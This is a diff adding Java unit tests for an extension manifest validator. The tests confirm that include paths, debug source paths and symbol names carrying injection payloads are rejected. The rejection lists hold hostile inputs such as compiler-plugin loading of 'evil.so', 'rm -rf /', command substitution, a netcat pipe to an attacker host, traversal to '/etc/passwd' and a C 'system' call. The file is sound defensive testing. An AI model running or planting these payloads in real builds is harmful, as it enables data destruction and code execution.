@@ -133,6 +133,180 @@ public class ExtensionManifestValidatorTest {
     }
 
     @Test
+    public void testValidateIncludePaths() throws ExtenderException {
+        List<String> empty = new ArrayList<>();
+        ExtensionManifestValidator validator = new ExtensionManifestValidator(new WhitelistConfig(), empty, empty);
+
+        File extensionFolder = new File("ext-folder");
+
+        // Happy paths
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", new ArrayList<String>());
+            validator.validate("ext", extensionFolder, ctx);
+        });
+
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", Arrays.asList("include"));
+            validator.validate("ext", extensionFolder, ctx);
+        });
+
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", Arrays.asList("./include"));
+            validator.validate("ext", extensionFolder, ctx);
+        });
+
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", Arrays.asList("src/foo", "src/bar"));
+            validator.validate("ext", extensionFolder, ctx);
+        });
+
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", Arrays.asList("include-1.2_beta/path"));
+            validator.validate("ext", extensionFolder, ctx);
+        });
+
+        // Space injection — PoC from the bug report
+        String[] injections = new String[] {
+                "./ -Xclang -load /etc/libs/evil.so",
+                "include -I/etc",
+                "include\t-I/etc",
+                "include\n-I/etc",
+                "include;rm -rf /",
+                "include$(whoami)",
+                "include`id`",
+                "include|nc attacker 1337",
+                "include\"quoted\"",
+                "include\\backslash",
+                "",
+        };
+        for (String bad : injections) {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", Arrays.asList(bad));
+            ExtenderException exc = assertThrows(ExtenderException.class, () -> {
+                validator.validate("ext", extensionFolder, ctx);
+            }, "expected rejection of include: " + bad);
+            assertTrue(exc.getMessage().contains("Invalid include path"),
+                    "message should mention Invalid include path, got: " + exc.getMessage());
+        }
+
+        // Path traversal is still rejected (by existing isChild check)
+        {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", Arrays.asList("../../etc/passwd"));
+            assertThrows(ExtenderException.class, () -> {
+                validator.validate("ext", extensionFolder, ctx);
+            });
+        }
+
+        // Non-list includes is rejected
+        {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("includes", "not-a-list");
+            assertThrows(ExtenderException.class, () -> {
+                validator.validate("ext", extensionFolder, ctx);
+            });
+        }
+    }
+
+    @Test
+    public void testValidateAppManifestContextDebugSourcePath() throws ExtenderException {
+        List<String> empty = new ArrayList<>();
+        ExtensionManifestValidator validator = new ExtensionManifestValidator(new WhitelistConfig(), empty, empty);
+
+        // Null context and empty / missing debugSourcePath are accepted
+        assertDoesNotThrow(() -> validator.validateAppManifestContext(null));
+        assertDoesNotThrow(() -> validator.validateAppManifestContext(new HashMap<>()));
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", "");
+            validator.validateAppManifestContext(ctx);
+        });
+
+        // Legitimate paths
+        String[] good = new String[] {
+                "/tmp/build",
+                "src",
+                "./src",
+                "build/intermediate-1.2_x",
+                "/Users/me/project/src",
+        };
+        for (String s : good) {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", s);
+            assertDoesNotThrow(() -> validator.validateAppManifestContext(ctx),
+                    "expected to accept debugSourcePath: " + s);
+        }
+
+        // PoC + injection variants
+        String[] bad = new String[] {
+                "/tmp -Xclang -load /etc/libs/evil.so",
+                "/tmp -fplugin=/etc/libs/evil.so",
+                "/tmp\t-I/etc",
+                "/tmp\n-I/etc",
+                "/tmp;rm -rf /",
+                "/tmp$(whoami)",
+                "/tmp`id`",
+                "/tmp|nc attacker 1337",
+                "/tmp\"quoted\"",
+                "/tmp\\backslash",
+                "with space",
+        };
+        for (String s : bad) {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", s);
+            ExtenderException exc = assertThrows(ExtenderException.class,
+                    () -> validator.validateAppManifestContext(ctx),
+                    "expected rejection of debugSourcePath: " + s);
+            assertTrue(exc.getMessage().contains("debugSourcePath"),
+                    "message should mention debugSourcePath, got: " + exc.getMessage());
+        }
+
+        // Wrong type is rejected
+        {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", 42);
+            assertThrows(ExtenderException.class,
+                    () -> validator.validateAppManifestContext(ctx));
+        }
+    }
+
+    @Test
+    public void testValidateSymbols() throws ExtenderException {
+        List<String> empty = new ArrayList<>();
+        ExtensionManifestValidator validator = new ExtensionManifestValidator(new WhitelistConfig(), empty, empty);
+
+        File extensionFolder = new File("ext-folder");
+
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("symbols", Arrays.asList("MyExtension", "_underscore", "mix3d_42"));
+            validator.validate("ext", extensionFolder, ctx);
+        });
+
+        String[] bad = new String[] {
+                "x();system(\"pwn\");void y",
+                "has space",
+                "1startsWithDigit",
+                "has-dash",
+                "",
+        };
+        for (String s : bad) {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("symbols", Arrays.asList(s));
+            ExtenderException exc = assertThrows(ExtenderException.class, () -> {
+                validator.validate("ext", extensionFolder, ctx);
+            }, "expected rejection of symbol: " + s);
+            assertTrue(exc.getMessage().contains("Invalid symbol"),
+                    "message should mention Invalid symbol, got: " + exc.getMessage());
+        }
+    }
+
+    @Test
     public void testAllowedLibs() throws ExtenderException {
         Map<String, Object> context = new HashMap<>();
 
